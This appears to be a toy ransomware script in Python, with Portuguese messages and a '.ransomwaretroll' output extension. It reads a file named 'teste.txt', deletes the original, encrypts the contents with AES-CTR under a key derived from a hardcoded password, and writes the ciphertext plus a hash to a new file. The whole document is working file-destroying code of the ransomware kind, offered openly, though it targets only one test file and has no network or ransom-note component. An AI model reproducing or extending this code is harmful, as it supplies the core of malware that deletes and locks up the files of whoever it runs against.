import os
import pyaes
import hashlib

file_name = "teste.txt"

def generate_key(password):
    return hashlib.sha256(password.encode()).digest()

def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as file:
            file_data = file.read()
        os.remove(file_path)
        aes = pyaes.AESModeOfOperationCTR(key)
        crypto_data = aes.encrypt(file_data)
        integrity_hash = hashlib.sha256(crypto_data).digest()
        new_file_path = file_path + '.ransomwaretroll'
        with open(new_file_path, 'wb') as new_file:
            new_file.write(crypto_data + integrity_hash)
        print(f"Arquivo {file_path} criptografado com sucesso.")
    except Exception as e:
        print(f"Erro ao criptografar o arquivo: {e}")

password = "senha_segura"
key = generate_key(password)
file_path_to_encrypt = (file_name)
encrypt_file(file_path_to_encrypt, key)
